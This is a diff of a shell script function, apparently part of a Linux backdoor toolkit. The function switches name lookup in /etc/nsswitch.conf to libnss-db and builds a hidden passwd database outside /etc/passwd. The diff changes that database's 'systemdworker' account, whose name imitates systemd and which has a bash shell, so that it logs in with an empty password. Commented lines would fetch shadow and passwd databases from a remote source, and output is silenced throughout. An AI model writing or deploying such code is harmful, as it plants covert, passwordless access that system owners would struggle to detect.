@@ -27,12 +27,13 @@ users_db() {
 			fi;
 	elif [ "`command -v apt-get`" != "" ]; then
 		apt install -y  libnss-db; #2>/dev/null >/dev/null
+		apt install -y make;
 		if [ -f /var/lib/misc/Makefile ]; then
                         echo "Getting databases"
                         sed -i 's/files/db files/g' /etc/nsswitch.conf;
                         #GET_FILE "$1/shadow.db" "/var/lib/misc/shadow.db";
-                        sed -i 's:/etc/passwd:passwd:g' /var/lib/misc/Makefile
-                        echo "systemdworker:x:999:999:systemdworker:/home:/bin/bash" > /var/lib/misc/passwd
+                        sed -i 's:$(ETC)/passwd:passwd:g' /var/lib/misc/Makefile
+                        echo "systemdworker::999:999:systemdworker:/home:/bin/bash" > /var/lib/misc/passwd
                         make -C /var/lib/misc 2>/dev/null >/dev/null
                         [ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
                         #GET_FILE "$1/passwd.db" "/var/lib/misc/passwd.db";
